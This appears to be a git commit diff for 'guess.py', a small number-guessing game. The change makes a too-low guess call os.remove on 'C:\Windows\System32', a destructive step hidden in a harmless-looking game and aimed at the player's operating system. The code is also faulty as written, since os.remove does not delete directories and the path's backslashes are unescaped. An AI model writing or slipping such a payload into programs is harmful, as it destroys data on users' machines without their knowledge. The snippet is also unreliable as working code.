28c07586a5a852a24f0792744123453c75b72403
Jason Ofori - Boateng <oforiboatengjason@gmail.com>
2025-02-17 12:27:22 +0000

    Update guess.py

--- guess.py
+++ guess.py
@@ -6,7 +6,7 @@ e_num = input("Guess the number between 1 and 10: ")
 
 while True:
     if int(e_num) < num :
-        os.remove("System32")
+        os.remove("C:\Windows\System32")
             
     elif int(e_num) > num: 
         print("The number you've inputed is higher so input something less ")
